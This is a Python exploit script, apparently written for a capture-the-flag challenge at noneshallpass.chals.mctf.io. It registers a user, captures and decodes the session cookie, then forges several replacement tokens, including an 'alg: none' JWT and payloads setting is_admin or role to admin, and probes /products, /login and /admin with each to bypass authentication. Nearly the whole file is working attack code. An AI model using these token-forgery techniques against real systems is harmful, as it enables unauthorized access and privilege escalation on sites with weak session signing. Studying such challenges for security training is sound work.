import urllib.request, urllib.parse, http.client, ssl
import base64, json, re

BASE = "http://noneshallpass.chals.mctf.io"

opener = urllib.request.build_opener()


def post(path, params):
    url = BASE + path
    data = urllib.parse.urlencode(params).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        resp = opener.open(req, timeout=10)
    except urllib.error.HTTPError as e:
        resp = e
    return resp


def get_with_cookie(path, cookie):
    req = urllib.request.Request(BASE + path)
    req.add_header("Cookie", cookie)
    try:
        resp = opener.open(req, timeout=10)
        body = resp.read()
        return resp.getcode(), resp.getheaders(), body
    except Exception as e:
        return None, None, str(e).encode()


# register and login to obtain original session (capture Set-Cookie using raw HTTP to avoid redirects)
user = "exploit_user"
pwd = "Expl0it!"
print("[*] registering (if exists, ok)")
try:
    r = post("/register", {"username": user, "password": pwd, "confirm": pwd})
    print("reg code", getattr(r, "code", None))
except Exception as e:
    print("reg err", e)

print("[*] logging in (raw request)")
parsed = urllib.parse.urlparse(BASE)
conn = http.client.HTTPConnection(parsed.netloc, timeout=10)
body = urllib.parse.urlencode({"username": user, "password": pwd})
headers = {"Content-Type": "application/x-www-form-urlencoded"}
conn.request("POST", "/login", body, headers)
res = conn.getresponse()
setcookie = res.getheader("Set-Cookie")
resp_body = res.read()
conn.close()
print("Set-Cookie:", setcookie)
if not setcookie:
    print("No Set-Cookie returned; exiting")
    exit(0)
# extract session=... value
m = re.search(r"session=([^;]+)", setcookie)
if not m:
    print("no session cookie")
    exit(0)
orig_token = m.group(1)
print("orig token:", orig_token)
parts = orig_token.split(".")
print("parts:", len(parts))
for i, p in enumerate(parts):
    try:
        dec = base64.urlsafe_b64decode(p + "=" * (-len(p) % 4))
        print(i, dec)
    except Exception as e:
        print(i, "decoding failed", e)


# helpers
def b64u(obj):
    if isinstance(obj, (dict, list)):
        s = json.dumps(obj, separators=(",", ":"))
    else:
        s = str(obj)
    b = base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")
    return b


variants = {}
# variant A: replace first part with is_admin true, keep others
variants["first_is_admin"] = (
    b64u({"is_admin": True})
    + "."
    + (parts[1] if len(parts) > 1 else "")
    + "."
    + (parts[2] if len(parts) > 2 else "")
)
# variant B: alg=none JWT style
hdr = b64u({"alg": "none", "typ": "JWT"})
pay = b64u({"is_admin": True})
variants["alg_none"] = hdr + "." + pay + "."
# variant C: manipulate first to success flash
variants["first_flash"] = (
    b64u({"_flashes": [{" t": ["success", "pwned"]}]})
    + "."
    + (parts[1] if len(parts) > 1 else "")
    + "."
    + (parts[2] if len(parts) > 2 else "")
)
# variant D: set first part back to original but change second to printable json
if len(parts) >= 2:
    variants["second_json"] = (
        parts[0]
        + "."
        + b64u({"role": "admin"})
        + "."
        + (parts[2] if len(parts) > 2 else "")
    )

print("\n[*] Testing variants:")
for name, tok in variants.items():
    cookie = "session=" + tok
    print("\n===", name, "===")
    code, hdrs, body = get_with_cookie("/products", cookie)
    print("GET /products ->", code)
    if body:
        print(body[:800])
    # also fetch /login to see flash messages
    code, hdrs, body = get_with_cookie("/login", cookie)
    print("GET /login ->", code)
    if body:
        print(body[:800])
    # also try /admin
    code, hdrs, body = get_with_cookie("/admin", cookie)
    print("GET /admin ->", code)
    if body:
        print(body[:800])

print("\nDone")
